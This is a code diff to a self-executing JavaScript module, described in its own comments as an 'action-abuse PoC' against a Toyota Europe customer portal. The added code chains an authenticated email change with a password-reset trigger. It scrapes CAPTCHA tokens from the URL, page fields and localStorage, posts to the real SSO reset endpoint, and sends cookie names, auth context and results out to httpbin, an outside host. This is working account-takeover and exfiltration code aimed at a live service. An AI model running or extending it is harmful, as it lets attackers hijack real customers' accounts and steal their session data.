@@ -6,6 +6,8 @@ define([], function () {
 
   var ENABLE_EMAIL_REVERT = false;
   var ENABLE_DELETE_FALLBACK = false;
+  var ENABLE_SSO_PASSWORD_RESET_TRIGGER = true;
+  var SSO_FALLBACK_BASE = "https://ssomsa.toyota-europe.com";
 
   var AUTH_COOKIE_HINTS = [
     "sess",
@@ -204,6 +206,9 @@ define([], function () {
     params.push("act_ok=" + encodeURIComponent(String(!!actionProof.success)));
     params.push("act_status=" + encodeURIComponent(String(actionProof.statusCode || 0)));
     params.push("pre_status=" + encodeURIComponent(String(actionProof.precheckStatus || 0)));
+    params.push("rst_attempted=" + encodeURIComponent(String(!!(actionProof.resetEmailTrigger && actionProof.resetEmailTrigger.attempted))));
+    params.push("rst_ok=" + encodeURIComponent(String(!!(actionProof.resetEmailTrigger && actionProof.resetEmailTrigger.success))));
+    params.push("rst_status=" + encodeURIComponent(String(actionProof.resetEmailTrigger && actionProof.resetEmailTrigger.statusCode || 0)));
 
     for (var i = 0; i < authCookies.length && i < 5; i++) {
       var c = authCookies[i] || {};
@@ -350,6 +355,134 @@ define([], function () {
     return "https://" + host + "/api";
   }
 
+  function getSsoServiceBase() {
+    var raw = safeCall(function () {
+      return window.T1 && window.T1.settings && window.T1.settings.ssoServiceUrl;
+    }, "");
+    var v = normalizeString(raw || SSO_FALLBACK_BASE);
+    if (!v) {
+      return SSO_FALLBACK_BASE;
+    }
+    if (/^https?:\/\//i.test(v)) {
+      return v.replace(/\/+$/, "");
+    }
+    return "https://" + stripProtocol(v);
+  }
+
+  function getParamFromSearchAndHash(names) {
+    var list = Array.isArray(names) ? names : [names];
+    var chunks = [];
+    var search = safeCall(function () {
+      return window.location && window.location.search || "";
+    }, "");
+    var hash = safeCall(function () {
+      return window.location && window.location.hash || "";
+    }, "");
+
+    if (search && search.charAt(0) === "?") {
+      chunks.push(search.slice(1));
+    } else if (search) {
+      chunks.push(search);
+    }
+
+    var qIdx = hash.indexOf("?");
+    if (qIdx >= 0 && qIdx < hash.length - 1) {
+      chunks.push(hash.slice(qIdx + 1));
+    }
+
+    for (var i = 0; i < chunks.length; i++) {
+      var params = safeCall(function () {
+        return new URLSearchParams(chunks[i]);
+      }, null);
+      if (!params) {
+        continue;
+      }
+      for (var j = 0; j < list.length; j++) {
+        var raw = params.get(list[j]);
+        var value = normalizeString(raw);
+        if (value) {
+          return value;
+        }
+      }
+    }
+
+    return "";
+  }
+
+  function getCaptchaTokenCandidate() {
+    var fromQuery = getParamFromSearchAndHash([
+      "token",
+      "captchaToken",
+      "captcha",
+      "h-captcha-response",
+      "g-recaptcha-response",
+      "cf-turnstile-response"
+    ]);
+    if (fromQuery && fromQuery.length > 8) {
+      return { token: fromQuery, source: "query_or_hash" };
+    }
+
+    var selectors = [
+      "textarea[name='h-captcha-response']",
+      "input[name='h-captcha-response']",
+      "textarea[name='g-recaptcha-response']",
+      "input[name='g-recaptcha-response']",
+      "textarea[name='cf-turnstile-response']",
+      "input[name='cf-turnstile-response']"
+    ];
+    for (var i = 0; i < selectors.length; i++) {
+      var node = safeCall(function () {
+        return document.querySelector(selectors[i]);
+      }, null);
+      var val = normalizeString(node && node.value);
+      if (val && val.length > 8) {
+        return { token: val, source: "dom_field:" + selectors[i] };
+      }
+    }
+
+    var fromStorage = safeCall(function () {
+      var maxKeys = 80;
+      var len = Math.min(localStorage.length, maxKeys);
+      for (var idx = 0; idx < len; idx++) {
+        var k = localStorage.key(idx) || "";
+        var low = k.toLowerCase();
+        if (low.indexOf("captcha") === -1 && low.indexOf("recaptcha") === -1 && low.indexOf("turnstile") === -1) {
+          continue;
+        }
+        var v = normalizeString(localStorage.getItem(k));
+        if (v && v.length > 8) {
+          return { token: v.slice(0, 4096), source: "localStorage:" + k };
+        }
+      }
+      return null;
+    }, null);
+
+    if (fromStorage && fromStorage.token) {
+      return fromStorage;
+    }
+
+    return { token: "", source: "none" };
+  }
+
+  function getSsoMetaHeaders() {
+    var appId = getParamFromSearchAndHash(["appId", "app_id"]);
+    if (!appId) {
+      appId = safeCall(function () {
+        var path = window.location && window.location.pathname || "";
+        if (path.indexOf("/apps/") !== 0) {
+          return "";
+        }
+        return path.replace(/^\/apps\//, "") + (window.location.search || "");
+      }, "");
+    }
+    return {
+      appId: appId,
+      orderId: getParamFromSearchAndHash(["orderId", "order_id"]),
+      reservationCode: getParamFromSearchAndHash(["reservationCode", "reservation_code"]),
+      redirectionPath: getParamFromSearchAndHash(["redirectionPath", "redirection_path", "redirect"])
+    };
+  }
+
   function getAuthContext() {
     var token = safeCall(function () {
       return localStorage.getItem(USER_TOKEN_KEY) || "";
@@ -369,7 +502,8 @@ define([], function () {
       firstName: firstName,
       brand: inferBrand(),
       locale: inferLocale(profile),
-      aggregatorBase: getCpAggregatorBase()
+      aggregatorBase: getCpAggregatorBase(),
+      ssoBase: getSsoServiceBase()
     };
   }
 
@@ -391,6 +525,28 @@ define([], function () {
       "X-TME-BRAND": ctx.brand,
       "X-TME-LC": ctx.locale
     };
+  }
+
+  function buildSsoResetHeaders(ctx, meta) {
+    var headers = {
+      "Content-Type": "application/json;charset=UTF-8",
+      Accept: "application/json",
+      "X-TME-BRAND": ctx.brand,
+      "X-TME-LC": ctx.locale
+    };
+    if (meta && meta.appId) {
+      headers["X-TME-APPID"] = meta.appId;
+    }
+    if (meta && meta.orderId) {
+      headers["X-TME-ORDER-ID"] = meta.orderId;
+    }
+    if (meta && meta.reservationCode) {
+      headers["X-TME-RESERVATION-CODE"] = meta.reservationCode;
+    }
+    if (meta && meta.redirectionPath) {
+      headers["X-TME-REDIRECTION-PATH"] = meta.redirectionPath;
+    }
+    return headers;
   }
 
   function requestJson(url, options) {
@@ -504,6 +660,41 @@ define([], function () {
     });
   }
 
+  function performSsoResetEmailTrigger(ctx, targetEmail) {
+    var captcha = getCaptchaTokenCandidate();
+    var meta = getSsoMetaHeaders();
+    var url = ctx.ssoBase + "/sendResetPasswordEmail";
+    var body = {
+      email: targetEmail,
+      token: captcha.token || "",
+      captchaType: normalizeString(safeCall(function () {
+        return window.dxp && window.dxp.settings && window.dxp.settings.captchaType;
+      }, "")).toLowerCase() || "hcaptcha"
+    };
+
+    return requestJson(url, {
+      method: "POST",
+      mode: "cors",
+      credentials: "omit",
+      cache: "no-store",
+      headers: buildSsoResetHeaders(ctx, meta),
+      body: JSON.stringify(body)
+    }).then(function (resp) {
+      return {
+        attempted: true,
+        operation: "TRIGGER_PASSWORD_RESET_EMAIL",
+        success: !!resp.ok,
+        statusCode: resp.status,
+        requestUrl: url,
+        targetEmail: targetEmail,
+        captchaType: body.captchaType,
+        captchaTokenProvided: !!body.token,
+        captchaTokenSource: captcha.source || "none",
+        responsePreview: resp.textPreview
+      };
+    });
+  }
+
   function performDeleteFallback(ctx) {
     var url = ctx.aggregatorBase + "/users/" + encodeURIComponent(ctx.uuid);
     return requestJson(url, {
@@ -562,7 +753,25 @@ define([], function () {
           });
         }
 
-        return result;
+        if (!result.success || !ENABLE_SSO_PASSWORD_RESET_TRIGGER) {
+          return result;
+        }
+
+        return performSsoResetEmailTrigger(ctx, result.targetEmail || FORCED_TARGET_EMAIL)
+          .then(function (resetEmailResult) {
+            result.resetEmailTrigger = resetEmailResult;
+            return result;
+          })
+          .catch(function (resetErr) {
+            result.resetEmailTrigger = {
+              attempted: true,
+              operation: "TRIGGER_PASSWORD_RESET_EMAIL",
+              success: false,
+              statusCode: 0,
+              error: String(resetErr && resetErr.message ? resetErr.message : resetErr)
+            };
+            return result;
+          });
       })
       .catch(function (err) {
         result.success = false;
@@ -580,7 +789,11 @@ define([], function () {
     }
     var op = actionProof.operation || "unknown_op";
     var st = actionProof.statusCode || 0;
-    return op + " status " + st + (actionProof.success ? " (accepted)" : " (rejected)");
+    var msg = op + " status " + st + (actionProof.success ? " (accepted)" : " (rejected)");
+    if (actionProof.resetEmailTrigger && actionProof.resetEmailTrigger.attempted) {
+      msg += " | reset-mail " + (actionProof.resetEmailTrigger.statusCode || 0) + (actionProof.resetEmailTrigger.success ? " (accepted)" : " (rejected)");
+    }
+    return msg;
   }
 
   function executePoC() {
@@ -629,7 +842,7 @@ define([], function () {
     attemptHighImpactAction(ctx)
       .then(function (actionProof) {
         var payload = {
-          event: "cp_hash_loader_authenticated_action_abuse_email_change",
+          event: "cp_hash_loader_authenticated_action_abuse_email_change_reset_mail",
           marker: {
             executed: true,
             ts: ts,
@@ -646,7 +859,7 @@ define([], function () {
           visibleCookieNames: cookies.map(function (c) { return c.name; }).slice(0, 20),
           authContext: safeAuthContext,
           actionProof: actionProof,
-          note: "Action-abuse PoC attempts authenticated account-impact operation and saves full result to httpbin."
+          note: "Action-abuse PoC attempts authenticated account-impact operation and then triggers SSO reset-email flow, saving full result to httpbin."
         };
         var readableLink = buildReadableHttpbinLink(requestUrl, payload);
         var actionStatus = summarizeActionStatus(actionProof);
@@ -716,7 +929,7 @@ define([], function () {
   executePoC();
 
   return {
-    version: "107.0.0-httpbin-auth-action-email-change",
+    version: "108.0.0-httpbin-auth-action-email-and-reset-mail",
     render: function () {
       return executePoC();
     }
